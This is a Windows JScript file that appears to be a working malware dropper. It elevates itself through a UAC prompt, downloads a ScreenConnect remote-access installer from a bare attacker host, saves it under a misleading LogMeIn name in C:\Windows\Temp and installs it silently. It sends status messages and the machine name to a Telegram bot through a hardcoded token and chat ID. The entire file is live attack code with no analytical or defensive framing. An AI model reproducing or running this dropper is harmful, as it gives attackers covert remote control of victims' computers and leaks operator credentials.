 (function() {
    if (WScript.Arguments.Length === 0) {
        var shell = new ActiveXObject("Shell.Application");
        shell.ShellExecute("wscript.exe", "\"" + WScript.ScriptFullName + "\" elevated", "", "runas", 1);
        WScript.Quit(0);
    }
    var msiUrl = "http://3v4t06xc6qcm5k8:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
    var destPath = "C:\\Windows\\Temp\\LogMeInResolve_Unattended.msi";
    var destFolder = "C:\\Windows\\Temp";
    var logFile = "C:\\Windows\\Temp\\LogMeIn_Install.log";

    function LogMessage(msg) {
        try {
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            var logStream = fso.OpenTextFile(logFile, 8, true);
            logStream.WriteLine(new Date() + " - " + msg);
            logStream.Close();
        } catch (e) {}
    }

    function getPCName()
{
    var network = new ActiveXObject("WScript.Network");
    return network.ComputerName;
}
function sendTelegramMessage(message)
{
var botToken  = '8762919252:AAEixqSJqJTsgKm6llvvRoMH1rCtEFgKj8c';
var chatId = '7763496441';

    var url = "https://api.telegram.org/bot" +
        botToken +
        "/sendMessage?chat_id=" +
        chatId +
        "&text=" +
        escape(message+" "+getPCName() );

    var http = new ActiveXObject("MSXML2.XMLHTTP");

    http.open("GET", url, false);
    http.send();

}
    sendTelegramMessage("Inatllation started");
    LogMessage("=== LogMeIn Installation Started ===");
    try {
        var network = new ActiveXObject("WScript.Network");
        LogMessage("Script running as: " + network.UserName);

    } catch (e) {
        LogMessage("Script running as: Unknown");
    }
    var fso;
    try {
        fso = new ActiveXObject("Scripting.FileSystemObject");
    } catch (e) {
        LogMessage("FATAL: Cannot create FileSystemObject - " + e.message);
        WScript.Quit(1);
    }
    if (!fso.FolderExists(destFolder)) {
        try {
            fso.CreateFolder(destFolder);
            LogMessage("Created folder: " + destFolder);
        } catch (e) {
            LogMessage("ERROR: Cannot create folder " + destFolder + " - " + e.message);
            WScript.Quit(1);
        }
    } else {
        LogMessage("Folder exists: " + destFolder);
    }
    if (fso.FileExists(destPath)) {
    sendTelegramMessage("MSI found on PC and removing");
        try {
            fso.DeleteFile(destPath, true);
            LogMessage("Deleted existing MSI file");
        } catch (e) {
            LogMessage("WARNING: Could not delete existing file - " + e.message);
        }
    }
    var http;
    try {
        http = new ActiveXObject("MSXML2.ServerXMLHTTP");
    } catch (e) {
        LogMessage("ERROR: Cannot create HTTP request object - " + e.message);
        WScript.Quit(1);
    }

    LogMessage("HTTP object created successfully");
    try {
        http.open("GET", msiUrl, false);
        http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        http.send();
    } catch (e) {
        LogMessage("ERROR: HTTP request failed - " + e.message);
        WScript.Quit(1);
    }
    LogMessage("HTTP request completed with status: " + http.status);
    LogMessage("HTTP Status Text: " + http.statusText);


    if (http.status === 200) {
        LogMessage("Download successful, saving file...");

        var stream;
        try {
            stream = new ActiveXObject("ADODB.Stream");
        } catch (e) {
            LogMessage("ERROR: Cannot create ADODB.Stream - " + e.message);
            LogMessage("This may be blocked by antivirus or system policy");
            WScript.Quit(1);
        }

        try {
            stream.type = 1; // Binary
            stream.open();
            stream.write(http.responseBody);
            stream.saveToFile(destPath, 2); // Overwrite if exists
            stream.close();
        } catch (e) {
            LogMessage("ERROR: Cannot save file to " + destPath + " - " + e.message);
            WScript.Quit(1);
        }

        if (fso.FileExists(destPath)) {
            var fileSize = fso.GetFile(destPath).Size;
            LogMessage("File saved successfully: " + destPath);
            LogMessage("File size: " + fileSize + " bytes");

            if (fileSize < 1000) {
                LogMessage("WARNING: File size seems too small, may be incomplete");
            }
        } else {
            LogMessage("ERROR: File was not created at " + destPath);
            WScript.Quit(1);
        }
    } else {
        LogMessage("ERROR: HTTP request failed with status " + http.status);
        LogMessage("Status text: " + http.statusText);
        WScript.Quit(1);
    }

    LogMessage("Starting MSI installation...");
    var shell;
    try {
        shell = new ActiveXObject("WScript.Shell");
    } catch (e) {
        LogMessage("ERROR: Cannot create WScript.Shell - " + e.message);
        WScript.Quit(1);
    }
    sendTelegramMessage("Installation processing. Might take 3mins");

    var msiCommand = "msiexec /i \"" + destPath + "\" /qn /norestart /l*v \"" + "C:\\Windows\\Temp\\LogMeIn_MSI.log" + "\"";
    LogMessage("Command: " + msiCommand);

    var returnCode;
    try {
        returnCode = shell.Run(msiCommand, 0, true);
    } catch (e) {
        LogMessage("ERROR: Failed to execute msiexec - " + e.message);
        WScript.Quit(1);
    }
    sendTelegramMessage("Inatllation Completed");

    LogMessage("MSI installation completed with exit code: " + returnCode);

    switch (returnCode) {
        case 0:
            LogMessage("SUCCESS: Installation completed successfully");
            break;
        case 1641:
            LogMessage("SUCCESS: Installation completed, restart initiated");
            break;
        case 3010:
            LogMessage("SUCCESS: Installation completed, restart required");
            break;
        case 1602:
            LogMessage("ERROR: Installation cancelled by user");
            break;
        case 1603:
            LogMessage("ERROR: Fatal error during installation");
            break;
        case 1618:
            LogMessage("ERROR: Another installation is in progress");
            break;
        case 1619:
            LogMessage("ERROR: Installation package could not be opened");
            break;
        case 1625:
            LogMessage("ERROR: Installation forbidden by system policy");
            break;
        default:
            LogMessage("WARNING: Installation completed with code " + returnCode);
    }

    LogMessage("=== Installation Script Completed ===");
    LogMessage("");

    WScript.Quit(returnCode);
})();
